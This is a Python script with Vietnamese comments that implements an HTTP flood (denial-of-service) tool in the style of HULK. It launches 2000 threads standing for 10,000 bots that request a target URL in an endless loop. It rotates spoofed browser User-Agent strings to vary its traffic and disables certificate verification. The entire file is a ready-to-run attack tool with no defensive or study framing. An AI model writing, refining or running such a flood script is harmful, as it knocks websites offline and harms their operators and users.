import requests
import threading
import random
import time
from queue import Queue
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
import warnings
from urllib3.exceptions import InsecureRequestWarning

# Vô hiệu hóa cảnh báo không xác minh chứng chỉ
warnings.simplefilter('ignore', InsecureRequestWarning)

total_bots = 10000  # Số lượng bots muốn chạy
max_threads = 2000  # Tăng số luồng tối đa

# Danh sách User-Agent lớn hơn để đa dạng hóa các yêu cầu
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14E5239e Safari/602.1',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/18.17763',

]


urls = [
    "url muon hulk"
]

# Tạo một session với cơ chế retry
def create_session():
    session = requests.Session()
    retries = Retry(total=5, backoff_factor=1, status_forcelist=[500, 502, 503, 504])
    adapter = HTTPAdapter(max_retries=retries)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    return session

def access_website(bot_id, user_agent, session, url):
    headers = {
        'User-Agent': user_agent,
        'Accept-Language': 'en-US,en;q=0.9',
        'Referer': url
    }

    while True:  # Vòng lặp vô hạn
        try:
            response = session.get(url, headers=headers, verify=False, timeout=10)
            if response.status_code == 403:
                print(f"Bot {bot_id} bị từ chối quyền truy cập: 403.")
                break  # Dừng lại nếu gặp lỗi 403
            print(f"Bot {bot_id} truy cập {url} thành công: {response.status_code}")
        except requests.exceptions.ConnectionError as e:
            print(f"Bot {bot_id} gặp lỗi kết nối: {e}.")
        except requests.exceptions.Timeout:
            print(f"Bot {bot_id} đã hết thời gian chờ. Thử lại...")
        except requests.exceptions.RequestException as e:
            print(f"Bot {bot_id} gặp lỗi: {e}")

def worker(queue):
    session = create_session()  # Tạo session để dùng lại cho nhiều yêu cầu
    while not queue.empty():
        bot_id = queue.get()
        user_agent = random.choice(user_agents)
        url = random.choice(urls)  # Chọn ngẫu nhiên một URL từ danh sách
        access_website(bot_id, user_agent, session, url)
        queue.task_done()

def main():
    bot_queue = Queue()

    for i in range(total_bots):
        bot_queue.put(i)

    threads = []
    for _ in range(max_threads):
        thread = threading.Thread(target=worker, args=(bot_queue,))
        threads.append(thread)
        thread.start()

    bot_queue.join()

    for thread in threads:
        thread.join()

    print("Hoàn thành!")

if __name__ == "__main__":
    main()
